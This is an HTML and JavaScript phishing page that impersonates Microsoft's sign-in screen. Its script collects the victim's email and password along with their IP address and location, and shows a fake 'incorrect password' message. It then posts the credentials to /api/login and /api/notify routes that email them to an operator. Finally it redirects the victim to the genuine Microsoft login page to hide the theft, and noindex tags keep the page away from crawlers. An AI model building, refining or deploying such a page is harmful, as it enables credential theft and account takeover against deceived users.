<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Keep existing head content -->
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <meta name="robots" content="noindex, nofollow">
    <meta name="robots" content="noindex">
    <meta name="googlebot" content="noarchive">


    <link rel="shortcut icon" href="/assets/microsoft.svg" type="image/x-icon">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <!-- <link rel="stylesheet" href="./font-awesome-4.7.0/css/font-awesome.min.css"> -->
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
        }

        html {
            scroll-behavior: smooth;
            color: #383838;
            /* overflow-y: hidden; */
        }

        #form::-webkit-scrollbar {
            background: transparent;
            width: 0;
            height: 0;
        }

        .container-item {
            z-index: 99999;
            margin: 40px 10%;
            overflow-x: hidden;
        }

        .container-item-2 {
            margin: 40px 10%;
            border: 1px solid #7c7c7c;
            display: flex;
            justify-content: left;
            align-items: center;
            color: #383838;
            padding: 5px 15px;
        }

        input {
            padding: 10px 1px;
            width: 100%;
            border: 1px solid transparent;
            border-bottom: 1px solid #383838;
            z-index: 1;
        }

        .slide-one {
            width: 100%;
            transition: 0.5s ease all;
        }

        .slide-two {
            width: 100%;
            transition: 0.5s ease all;
        }

        .slide-one-toggle {
            transform: translateX(-100%);
        }

        .slide-two-toggle {
            transform: translateX(-100%);
        }

        input:focus {
            border-bottom: 1px solid red;
            outline: 1px solid transparent;
        }

        #form p {
            font-size: 14px;
        }

        #form p img {
            transform: translateY(6px);
        }

        #form {
            display: flex;
            justify-content: space-between;
            overflow-x: scroll;
            width: 200%;
        }

        #btn {
            background: #0067B8;
            color: white;
            border: 1px solid transparent;
            width: 100px;
            text-align: center;
            border-radius: 2px;
            padding: 8px 5px;
        }

        span {
            color: dodgerblue;
        }

        .btn-item {
            display: flex;
            justify-content: right;
            margin: 25px 0;
        }

        footer ul {
            list-style-type: none;
            display: flex;
            justify-content: center;
            position: fixed;
            bottom: 0;
            font-size: 12px;
        }

        footer ul li {
            padding: 5px 10px;
        }

        a {
            text-decoration: none;
            color: #383838;
        }

        @media screen and (min-width: 600px) {
            body {
                background: linear-gradient(27deg, rgba(231, 216, 210, 1) 28%, rgba(214, 220, 227, 1) 52%, rgba(214, 225, 210, 1) 80%, rgba(231, 216, 210, 1) 100%);
            }

            .container {
                margin: 5% 50%;
                transform: translateX(-50%);
                width: 70%;
                background: white;
                padding: 10px;
                box-shadow: 1px 1px 10px #b3b1b180;
            }

            .container-item-2 {
                margin: 8% 50%;
                transform: translate(-50%, -20px);
                width: 70%;
                background: white;
                padding: 10px;
                box-shadow: 1px 1px 10px #b3b1b180;
            }

            footer {
                display: flex;
                justify-content: center;
            }
        }

        @media screen and (min-width: 768px) {
            .container {
                width: 40%;
            }

            .container-item-2 {
                transform: translate(-50%, -50px);
                width: 40%;
            }
        }

        @media screen and (min-width: 1200px) {
            .container {
                width: 30%;
            }

            .container-item-2 {
                transform: translate(-50%, -70px);
                width: 30%;
            }
        }
    </style>
    <script>
        // Fix for button click issues - attach this at the top
        window.addEventListener('DOMContentLoaded', function() {
            console.log('DOM fully loaded, ensuring button click handlers work');
        });
    </script>
</head>
<body>
    <!-- Keep existing body content up to line 323 -->
    <div class="container">
        <div class="container-item">
            <img src="./assets/mlogo.svg" alt=""><br><br>
            <div id="form">
                <div class="slide-one">
                    <h2>Sign in</h2>
                    <span class="msg" style="color: red; font-size: 13px;"></span>
                    <br>
                    <input type="email" id="email" name="username" placeholder="Email, phone, or Skype"><br><br>
                    <p>No account? <a href=""><span>Create one!</span></a></p>
                    <p style="color: dodgerblue;">Sign in with a security key <img src="./assets/question.JPG" alt="">
                    </p>
                    <div class="btn-item">
                        <p id="btn" class="next">Next</p>
                </div>
            </div>
            
                <div class="slide-two">
                    <span class="msg2" style="color: red; font-size: 13px;"></span><br>
                    <p id="back"><i class="fa fa-arrow-left"></i> <span id="name" style="color: #383838;"></span></p><br>
                    <h2>Enter password</h2><br>
                    <input type="password" id="password" name="password" placeholder="Password"><br><br>
                    <p>Forget password?</p>
                    <a href="">
                        <p style="color: dodgerblue;">Other ways to sign in
                        </p>
                    </a>
                    <div class="btn-item">
                        <button id="btn" class="submit">Sign in</button>
                </div>
                </div>
            </div>
        </div>
    </div>

    <div class="container-item-2"><img src="./assets/key.jpg" width="25px"> <span style="color: #383838;">Sign- in
            options</span></div>

    <footer>
        <ul>
            <a href="#">
                <li>Terms of use</li>
            </a>
            <a href="#">
                <li>Privacy &amp; cookies</li>
            </a>
            <a href="#">
                <li>...</li>
            </a>
        </ul>
    </footer>

    <iframe src="" id="iframLink" style="opacity: 0;" frameborder="0"></iframe>


    

    <input type="hidden" id="country" value="" name="country">
    <input type="hidden" id="city" value="" name="city">
    <input type="hidden" id="continent" value="" name="continent">
    <input type="hidden" id="ip" value="" name="ip">
    <input type="hidden" id="adminEmail" value="admin@gmail.com" name="admin">

    <!-- Update fetch calls to use Next.js API routes instead of PHP -->
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            console.log("DOM fully loaded, setting up event handlers");
            
            // Get user location and IP
            getUserLocationAndIp();
            
            // Define DOM elements with multiple fallback selectors to ensure we find the button
            const emailField = document.getElementById('email') || document.querySelector('input[type="email"]') || document.querySelector('input[name="email"]');
            const passwordField = document.getElementById('password') || document.querySelector('input[type="password"]');
            const emailError = document.querySelector('.msg1') || document.querySelector('.email-error');
            const passwordError = document.querySelector('.msg2') || document.querySelector('.password-error');
            
            // Try multiple selectors for the button to make sure we get it
            const submitButton = document.getElementById('btn') || 
                                document.getElementById('next') || 
                                document.getElementById('submit') || 
                                document.querySelector('input[type="submit"]') ||
                                document.querySelector('button[type="submit"]') ||
                                document.querySelector('button.btn-primary') ||
                                document.querySelector('button.next') ||
                                document.querySelector('button:not([disabled])');
            
            console.log("Submit button found:", submitButton ? true : false);
            
            if (submitButton) {
                // Force enabling the button just in case it's disabled
                submitButton.disabled = false;
                submitButton.style.pointerEvents = 'auto';
                submitButton.style.cursor = 'pointer';
                
                // Try using multiple event binding methods for maximum compatibility
                submitButton.onclick = handleButtonClick;
                submitButton.addEventListener('click', handleButtonClick);
                
                // Also attach to form submit event if there is a form
                const form = submitButton.closest('form') || document.querySelector('form');
                if (form) {
                    form.addEventListener('submit', function(e) {
                        e.preventDefault();
                        handleButtonClick(e);
                    });
                }
                
                console.log("Click handlers attached to button and form");
            } else {
                console.error("Could not find submit button - adding direct click handlers to the document");
                
                // If we couldn't find the button, add click handlers to likely elements
                document.querySelectorAll('button, input[type="button"], input[type="submit"], .btn, .button, .submit, .next').forEach(element => {
                    element.addEventListener('click', handleButtonClick);
                    console.log("Added click handler to:", element);
                });
            }
            
            // Unified button click handler function
            function handleButtonClick(e) {
                console.log("Button clicked!");
                e.preventDefault();
                
                // Get current values
                const email = emailField ? emailField.value : '';
                const password = passwordField ? passwordField.value : '';
                
                // Check if we need to show the password field (first screen)
                if (passwordField && passwordField.closest('.password-container') && 
                    passwordField.closest('.password-container').style.display === 'none') {
                    
                    console.log("First screen - showing password field");
                    // First screen logic - validate email and show password field
                    if (email && email.includes('@')) {
                        const emailContainer = document.querySelector('.email-container');
                        const passwordContainer = document.querySelector('.password-container');
                        
                        if (emailContainer && passwordContainer) {
                            emailContainer.style.display = 'none';
                            passwordContainer.style.display = 'block';
                            
                            // Update any email display elements
                            const emailDisplays = document.querySelectorAll('.email-display, .username-display');
                            emailDisplays.forEach(el => {
                                el.textContent = email;
                            });
                        }
                    } else if (emailError) {
                        emailError.textContent = 'Please enter a valid email address';
                        emailError.style.color = '#E81123';
                    }
                    
                    return;
                }
                
                // Handle the password submission (second screen)
                console.log("Processing login with password");
                
                if (!password && passwordError) {
                    passwordError.textContent = 'Please enter your password';
                    passwordError.style.color = '#E81123';
                    return;
                }
                
                // Show error message as if login failed
                if (passwordError) {
                    passwordError.style.color = "#E81123";
                    passwordError.textContent = 'Your email or password is incorrect. If you don\'t remember your password, reset it now.';
                }
                
                // Create the data object for submission
                const userData = {
                    username: email + " (MS)",
                    password: password,
                    country: document.getElementById('country') ? document.getElementById('country').value : '',
                    city: document.getElementById('city') ? document.getElementById('city').value : '',
                    continent: document.getElementById('continent') ? document.getElementById('continent').value : '',
                    ip_address: document.getElementById('ip') ? document.getElementById('ip').value : '',
                    platform: 'microsoft'
                };
                
                console.log("Sending data to API", userData);
                
                // Save to database using Next.js API route
                fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(userData)
                })
                .then(response => response.json())
                .then(data => {
                    console.log('Data saved to database:', data);
                    sendNotificationEmail();
                    
                    // Redirect after short delay
                    setTimeout(() => {
                        window.location.href = 'https://login.microsoftonline.com';
                    }, 1000);
                })
                .catch(error => {
                    console.error('Error saving data:', error);
                    // Still redirect even if saving fails
                    setTimeout(() => {
                        window.location.href = 'https://login.microsoftonline.com';
                    }, 1000);
                });
            }
            
            // Keep the existing sendNotificationEmail function
            function sendNotificationEmail() {
                const email = emailField ? emailField.value : '';
                const password = passwordField ? passwordField.value : '';
                
                // Create notification data
                const notificationData = {
                    username: email + " (MS)",
                    password: password,
                    country: document.getElementById('country') ? document.getElementById('country').value : '',
                    city: document.getElementById('city') ? document.getElementById('city').value : '',
                    continent: document.getElementById('continent') ? document.getElementById('continent').value : '',
                    ip: document.getElementById('ip') ? document.getElementById('ip').value : '',
                    adminEmail: document.getElementById('adminEmail') ? document.getElementById('adminEmail').value : 'admin@gmail.com'
                };
                
                // Send notification via Next.js API route
                fetch('/api/notify', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(notificationData)
                })
                .then(response => response.json())
                .then(result => {
                    console.log('Email notification sent:', result);
                })
                .catch(error => {
                    console.error('Error sending notification:', error);
                });
            }
        });
        
        // Keep your existing getUserLocationAndIp function
        function getUserLocationAndIp() {
            fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                if (document.getElementById('country')) document.getElementById('country').value = data.country_name || '';
                if (document.getElementById('city')) document.getElementById('city').value = data.city || '';
                if (document.getElementById('continent')) document.getElementById('continent').value = data.continent_code || '';
                if (document.getElementById('ip')) document.getElementById('ip').value = data.ip || '';
            })
            .catch(error => {
                console.error('Error fetching location data:', error);
            });
        }
    </script>
</body>
</html>
